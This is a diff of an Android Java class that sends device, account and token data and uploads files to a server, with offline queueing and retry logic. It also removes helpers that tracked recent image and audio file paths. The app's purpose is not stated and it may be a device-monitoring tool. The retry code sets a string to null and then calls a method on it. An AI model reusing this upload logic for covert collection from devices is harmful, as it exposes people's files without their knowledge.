@@ -1,19 +1,21 @@
 package com.inet.android.request;
 
-import java.io.File;
-import java.io.FileNotFoundException;
-
+import org.apache.http.Header;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.preference.PreferenceManager;
-import android.util.Log;
 
+import com.inet.android.bs.NetworkChangeReceiver;
+import com.inet.android.db.OperationWithRecordInDataBase;
 import com.inet.android.info.DeviceInformation;
+import com.inet.android.request.FileCaller.RequestListener;
 import com.inet.android.utils.ConvertDate;
+import com.inet.android.utils.GeneratorLine;
 import com.inet.android.utils.Logging;
+import com.inet.android.utils.ValueWork;
 import com.loopj.android.http.RequestParams;
 
 public class RequestList {
@@ -103,6 +105,8 @@ public class RequestList {
 			jsonObject.put("device", sp.getString("device", "0000"));
 			jsonObject.put("account", sp.getString("account", "0000"));
 			jsonObject.put("token", sp.getString("time_setub", ""));
+			jsonObject.put("key_for_bug", GeneratorLine.createRandomString(mContext));
+			
 
 		} catch (JSONException e) {
 			Logging.doLog(LOG_TAG, "что-то не так с json",
@@ -135,7 +139,6 @@ public class RequestList {
 	 */
 	public static void sendPeriodicRequest(Context mContext) {
 		Logging.doLog(LOG_TAG, "sendPeriodicRequest", "sendPeriodicRequest");
-
 		PeriodicRequest pr = new PeriodicRequest(mContext);
 		pr.sendRequest(null);
 
@@ -172,71 +175,67 @@ public class RequestList {
 		} catch (JSONException e) {
 			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
 		}
-		Logging.doLog(LOG_TAG, "send data request", "send data request: ");
+		Logging.doLog(LOG_TAG, "send data request: 12", "send data request: 12");
 		DataRequest dataReq = new DataRequest(mContext);
 		dataReq.sendRequest(sendJSONStr);
 	}
-	/*
-	 * Sending service data request
-	 */
-	public static void sendFileRequest(String request,
-			Context mContext) {
-		Logging.doLog(LOG_TAG, "sendFileRequest ", "sendFileRequest ");
 
-//		RequestParams params = new RequestParams();
-//		params.			
-//		Logging.doLog(LOG_TAG, "params " + params.toString(), "params "
-//					+ params.toString());
-//			FileCaller.sendRequest(request, mContext);
-	
-	}
 	/**
 	 * Sending service data request
 	 */
-	public static void sendFileRequest(int typeValue, String path,
-			Context mContext) {
-		Logging.doLog(LOG_TAG, "sendFileRequest ", "sendFileRequest ");
+	public static void sendFileRequest(final RequestParams params,
+			final Context mContext) {
 
-		RequestParams params = new RequestParams();
-		try {
-			params.put("data[][time]", ConvertDate.logTime());
-			params.put("data[][type]", typeValue);
-			params.put("data[][path]", path);
-			params.put("key", System.currentTimeMillis());
-			params.put("data[][file]", new File(path));
-
-			Logging.doLog(LOG_TAG, "params " + params.toString() , "params "
-					+ params.toString());
-			FileCaller.sendRequest(params, mContext);
-		} catch (FileNotFoundException e) {
-			Log.d(LOG_TAG, "FileNotFoundException");
-			e.printStackTrace();
+		if (ValueWork.getMethod(ConstantValue.TYPE_DISPATCH, mContext) == 1) {
+			Logging.doLog(LOG_TAG, "TYPE_DISPATCH", "TYPE_DISPATCH");
+			if (NetworkChangeReceiver.isOnline(mContext) != 2) {
+				Logging.doLog(LOG_TAG, "isOnline != 2", "isOnline != 2");
+				OperationWithRecordInDataBase.insertRecord(params.toString(),
+						ConstantValue.TYPE_FILE_REQUEST, mContext);
+				return;
+			}
 		}
+		FileCaller handler = FileCaller.getInstance();
+		handler.sendRequest(params, mContext, new RequestListener() {
+			@Override
+			public void onSuccess(int arg0, Header[] arg1, JSONObject timeline) {
+				// do whatever you want here.
+				Logging.doLog(LOG_TAG, "onSuccess. StatusCode: " + arg0 + " "
+						+ timeline, "onSuccess. StatusCode" + arg0 + " "
+						+ timeline);
+				String str = "";
+				try {
+					str = timeline.getString("code");
+				} catch (JSONException e) {
+					str = null;
+				}
+				if (str.equals("2")) {
+					RequestList.sendPeriodicRequest(mContext);
+				} else if (str.equals("0")) {
+					OperationWithRecordInDataBase.insertRecord(
+							params.toString(), ConstantValue.TYPE_FILE_REQUEST,
+							mContext);
+					DisassemblyErrors.setError(str, mContext);
+				}
+
+			}
+
+			@Override
+			public void onFailure(int statusCode, Throwable throwable) {
+				// TODO Auto-generated method stub
+				Logging.doLog(LOG_TAG, "onFailru. StatusCode" + statusCode,
+						"onFailru. StatusCode" + statusCode);
+				DisassemblyErrors.setError(statusCode,
+						ConstantValue.TYPE_SECOND_TOKEN_REQUEST, mContext);
+				OperationWithRecordInDataBase.insertRecord(params.toString(),
+						ConstantValue.TYPE_FILE_REQUEST, mContext);
+
+			}
+
+		});
+
 	}
 
-	private static String lastImagePath = "";
-	private static String lastCreateAudioPath = "";
-	private static String lastAudioPath = "";
-	
-	public static void setLastImageFile(String path) {
-		lastImagePath = path;
-	}
-
-	public static String getLastImageFile() {
-		return lastImagePath;
-	}
-	public static void setLastCreateAudioFile(String path) {
-		lastCreateAudioPath = path;
-	}
-	public static void setLastAudioFile(String path) {
-		lastAudioPath = path;
-	}
-	public static String getLastCreateAudioFile() {
-		return lastCreateAudioPath;
-	}
-	public static String getLastAudioFile() {
-		return lastAudioPath;
-	}
 	/**
 	 * Sending demand request
 	 */
@@ -251,7 +250,6 @@ public class RequestList {
 	 * Sending demand request
 	 */
 	public static void sendInfoDeviceRequest(Context mContext) {
-
 		DeviceInformation device = new DeviceInformation(mContext);
 		device.getInfo();
 	}
